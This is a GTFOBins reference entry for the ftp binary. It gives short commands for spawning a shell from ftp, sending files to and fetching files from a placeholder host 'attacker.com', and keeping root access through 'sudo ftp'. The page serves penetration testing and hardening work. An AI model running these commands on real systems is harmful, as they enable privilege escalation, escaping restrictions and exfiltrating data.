# GTFOBin: ftp

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
ftp
!/bin/sh
```

## File upload

It can exfiltrate files on the network.

Send local file to a FTP server.

```
RHOST=attacker.com
ftp $RHOST
put file_to_send
```

## File download

It can download remote files.

Fetch a remote file from a FTP server.

```
RHOST=attacker.com
ftp $RHOST
get file_to_get
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo ftp
!/bin/sh
```